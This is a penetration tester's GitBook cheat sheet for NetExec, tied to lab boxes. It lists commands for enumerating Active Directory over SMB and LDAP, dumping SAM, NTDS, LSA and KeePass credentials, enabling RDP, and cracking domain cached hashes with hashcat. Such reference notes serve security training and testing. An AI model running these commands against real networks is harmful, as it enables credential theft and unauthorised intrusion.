---
cover: ../../../.gitbook/assets/nxc_logo.avif
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# NetExec (/CME)

[NetExec](https://www.netexec.wiki/#netexec) (nxc) is a **network service exploitation tool** that helps automate assessing the security of large networks. An amazing tool that makes enumerating and exploiting **Active Directory (AD) environments** exponentially more efficient! You can view its usage in almost any of the [AD-related boxes](../../../boxes/boxes/#active-directory).

## SMB

### Enumeration

{% tabs %}
{% tab title="Shares" %}
<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">nxc smb &#x3C;TARGET-IP> --shares
<strong># NULL session
</strong>nxc smb &#x3C;TARGET-IP> -p '' -u '' --shares
# guest session
nxc smb &#x3C;TARGET-IP> -p 'guest' -u '' --shares
# anonymous session
nxc smb &#x3C;TARGET-IP> -p 'anonymous' -u '' --shares
</code></pre>
{% endtab %}

{% tab title="Users" %}
{% code overflow="wrap" %}
```bash
# domain users
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --users
# local users
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --users --local-auth
# domain computer users
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --computers
# local computer users
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --computers --local-auth
# rids (default up to 4000)
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --rid-brute <max-rid>
cat nxc_users | awk '{print $6}' | awk -F'\' '{print $2}' > dom_users
```
{% endcode %}
{% endtab %}

{% tab title="Groups" %}
{% code overflow="wrap" %}
```bash
# domain groups
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --groups --local-groups 
# local groups
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --local-groups 
```
{% endcode %}
{% endtab %}

{% tab title="Sessions" %}
```bash
# active sessions
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --sessions
# logged on users
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --loggedon-users
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Password Policy" %}
```bash
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --pass-pol
```
{% endtab %}
{% endtabs %}

### Spidering and file upload/download

{% tabs %}
{% tab title="Download Share" %}
{% code overflow="wrap" %}
```bash
nxc smb 10.10.10.10 -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=420000 OUTPUT_FOLDER=SMB/
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Modules

The `whoami` module returns more information that just the `whoami` command.

```bash
nxc smb <ip> -u <user> -p <pass> -M whoami -o USER=<user>
```

Enumerate NICs.

```bash
# via WMI
nxc smb <ip> -u <user> -p <pass> -M get_netconnections
# via RPC
nxc smb <ip> -u <user> -p <pass> -M ioxidresolver
```

Keepass credentials. After running it check `/tmp/export.xml`.

{% code overflow="wrap" %}
```bash
# locate the keepass configuration file
nxc smb <ip> -u <user> -p <pass> -M keepass_discover
# check for creds
nxc smb <ip> -u <user> -p <pass> -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.xml 
```
{% endcode %}

Enable RDP.

```bash
nxc smb <ip> -u <user> -p <pass> -M rdp -o ACTION=enable
```

For **stealing hashes via writeable shares** via SMB check [here](../../../services/services/smb-139-445.md#hashes).

### Credentials

{% tabs %}
{% tab title="SAM" %}
```bash
nxc smb <ip> -u <user> -p <pass> --sam
```
{% endtab %}

{% tab title="NTDS" %}
```bash
nxc smb <ip> -u <user> -p <pass> --ntds --user <user>
```
{% endtab %}

{% tab title="LSA" %}
```bash
nxc smb <ip> -u <user> -p <pass> --lsa
```
{% endtab %}
{% endtabs %}

The hash format that starts with `$DCC2$` are the **Domain Cached Credentials 2 (DCC2)**, MS Cache 2. Those hashes can be cracked using Hashcat, provided a weak password is set because this algorithm is much stronger than NTLM. Also, DCC hashes cannot be used for a PtH attack. To crack them, we need to remove the domain and username, grab the value starting with `$DCC2$`.

```bash
# cracking hashes
$ cat /home/plaintext/.cme/logs/MS01_10.129.204.133_2022-11-08_093944.cached| cut -d ":" -f 2
$DCC2$10240#julio#c2139497f24725b345aa1e23352481f3
$DCC2$10240#david#a8338587a1c6ee53624372572e39b93f
$DCC2$10240#john#fbdeac2c1d121818f75796cedd0caf0a
 
$ hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt 
 
hashcat (v6.1.1) starting...
 
<SNIP>
 
$DCC2$10240#julio#c2139497f24725b345aa1e23352481f3:Password1
 
<SNIP>
```

## LDAP

### Modules

A DNS 'zone-transfer'.

```bash
nxc ldap <ip> -u <user> -p <pass> -M get-network -o ALL=true
```

Retrieve LAPS passwords.

```bash
nxc ldap <ip> -u <user> -p <pass> -M laps
```

DACL enumeration.

{% code overflow="wrap" %}
```bash
nxc ldap <ip> -u <user> -p <pass> -M daclread -o TARGET=<user> ACTION=read
# DCSync rights
nxc ldap <ip> -u <user> -p <pass> -M daclread -o TARGET_DN="DC=inlanefreight,DC=htb" ACTION=read RIGHTS=DCSync
```
{% endcode %}

## SSH

Key authentication.

```bash
nxc ssh <ip> -u root -p '' --key-file root_id_rsa
```

## Resources

{% tabs %}
{% tab title="Repo" %}
{% embed url="https://github.com/Pennyw0rth/NetExec" %}
{% endtab %}

{% tab title="Wiki" %}
{% embed url="https://www.netexec.wiki/" %}
{% endtab %}

{% tab title="Modules" %}
{% embed url="https://www.infosecmatter.com/crackmapexec-module-library/" %}
{% endtab %}

{% tab title="Demonstration" %}
{% embed url="https://www.youtube.com/watch?v=3SQMZzb4CnM" %}
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="HTB CME" %}
{% embed url="https://academy.hackthebox.com/course/preview/using-crackmapexec" %}
{% endtab %}

{% tab title="LAB" %}
{% embed url="https://www.nameyourpricetraining.com/courses/b6ce7e4c-5748-4272-b776-c400481791f6" %}
{% endtab %}
{% endtabs %}
